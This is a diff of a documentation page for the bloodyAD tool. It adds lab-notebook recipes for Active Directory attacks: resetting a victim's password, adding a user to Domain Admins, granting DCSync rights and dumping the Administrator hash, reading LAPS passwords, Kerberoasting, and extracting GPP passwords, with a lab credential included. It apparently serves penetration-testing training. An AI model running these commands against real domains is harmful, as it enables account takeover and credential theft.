@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=bloodyad) · [All tools](/index)
+
 **Requires:** Domain credentials and LDAP connectivity to the DC. For Kerberos, use the options supported by your installed version.
 
 ## Read an object
@@ -41,11 +43,165 @@ bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get membership USER
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=bloodyad)
+## Notebook recipes
 
-## Learning and original examples
+11 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [AD ACL Abuse: Quick Reference](/active-directory/acl-abuse)
-- [Service accounts and gMSA](/field/service-accounts)
-- [AD groups and effective access](/field/ad-groups)
+<AccordionGroup>
+
+<Accordion title="AD ACL Abuse: Quick Reference">
+
+### AD ACL Abuse: Quick Reference
+
+**AD ACL Abuse: Quick Reference**
+
+```bash
+# Linux equivalents
+bloodyAD -u USER -p PASS -d $DOMAIN --host $DC set password victim 'NewPass123!'
+bloodyAD -u USER -p PASS -d $DOMAIN --host $DC add groupMember 'Helpdesk' me
+```
+
+</Accordion>
+
+<Accordion title="6. Internal AD enumeration">
+
+### 6. Internal AD enumeration
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# valid? local admin anywhere? (look for (Pwn3d!))
+proxychains nxc smb 172.16.119.10 172.16.119.11 172.16.119.7 -u hwilliam -p 'dealer-screwed-gym1'
+# users / shares / policy
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' --users | tee users.txt
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --shares
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' -M spider_plus     # file inventory -> ~/.nxc/.../<ip>.json
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' --pass-pol
+# roasting (Password Attacks bread-and-butter)
+proxychains nxc ldap 172.16.119.11 -u bdavid -p '...' --kerberoasting kerb.txt
+proxychains nxc ldap 172.16.119.11 -u bdavid -p '...' --asreproast asrep.txt
+# SYSVOL GPP passwords
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' -M gpp_password
+# BloodHound (see the dedicated BloodHound cheatsheet)
+proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11 -c All --zip --dns-tcp
+# fast ACL check without the GUI:
+proxychains bloodyAD --host 172.16.119.11 -d nexura.htb -u bdavid -p '...' get writable
+```
+
+</Accordion>
+
+<Accordion title="Group → DCSync chain (what we&#x27;d have done with bdavid if those edges were outbound)">
+
+### Group → DCSync chain (what we'd have done with bdavid if those edges were outbound)
+
+**BloodHound: Full Reference**
+
+```bash
+# 1. add yourself to a powerful group (GenericAll/AddMember on it)
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add groupMember "Domain Admins" <you>
+# 2. or grant DCSync rights directly (WriteDacl on the domain)
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add dcsync <you>
+# 3. then replicate
+proxychains impacket-secretsdump '<domain>/<you>:<pass>'@<DC> -just-dc-user Administrator
+```
+
+</Accordion>
+
+<Accordion title="No‑GUI shortcut: bloodyAD">
+
+### No‑GUI shortcut: bloodyAD
+
+**BloodHound: Full Reference**
+
+```bash
+pipx install bloodyAD
+proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get writable     # what you can modify
+proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get object <target> --attr memberOf
+```
+
+</Accordion>
+
+<Accordion title="The three reusable &quot;I control a user&quot; primitives">
+
+### The three reusable "I control a user" primitives
+
+**BloodHound: Full Reference**
+
+```bash
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' set password <target> 'Newpass123!'
+# or:  net rpc password <target> 'Newpass123!' -U '<domain>/<you>%<pass>' -S <DC>
+```
+
+</Accordion>
+
+<Accordion title="Active Directory Attack Path: Worked Lab">
+
+### Active Directory Attack Path: Worked Lab
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Most commands here were run during the actual engagement, but  tool flags drift between versions  — this very box hit  xfreerdp  vs  xfreerdp3 ,  bloodyAD add dsync  vs  add dcsync , and  docker compose  vs  docker-compose . Treat each command as a  strong starting point : confirm syntax with  -h / --help  the first time on a new box, and  correct this note as you go  so it becomes your verified source of truth.
+
+```text
+bloodyAD add dsync
+```
+
+</Accordion>
+
+<Accordion title="ACL / object‑control edges (the escalation bread‑and‑butter)">
+
+### ACL / object‑control edges (the escalation bread‑and‑butter)
+
+**BloodHound: Full Reference**
+
+Context from the notebook: GenericAll  (on group) Add members bloodyAD ... add groupMember "&lt;group>" &lt;youruser>
+
+```text
+bloodyAD ... add groupMember "<group>" <youruser>
+```
+
+**BloodHound: Full Reference**
+
+Context from the notebook: WriteDacl Rewrite the object's DACL grant yourself GenericAll/DCSync:  dacledit / bloodyAD add genericAll
+
+```text
+bloodyAD add genericAll
+```
+
+**BloodHound: Full Reference**
+
+Context from the notebook: ForceChangePassword Reset their password (no old pw) bloodyAD ... set password &lt;target> 'NewPass123!'  or  net rpc password
+
+```text
+bloodyAD ... set password <target> 'NewPass123!'
+```
+
+**BloodHound: Full Reference**
+
+Context from the notebook: ReadLAPSPassword Read the local admin pw (LAPS) nxc ldap &lt;DC> -u u -p p -M laps  /  bloodyAD get object &lt;comp> --attr ms-Mcs-AdmPwd
+
+```text
+bloodyAD get object <comp> --attr ms-Mcs-AdmPwd
+```
+
+</Accordion>
+
+<Accordion title="⏱️ DECISION HEADER">
+
+### ⏱️ DECISION HEADER
+
+**BloodHound: Full Reference**
+
+Context from the notebook: Skip the GUI, just check ACLs fast bloodyAD get writable
+
+```text
+bloodyAD get writable
+```
+
+</Accordion>
+
+</AccordionGroup>
+
+## Related tools and references
+
 - [bloodyAD user guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
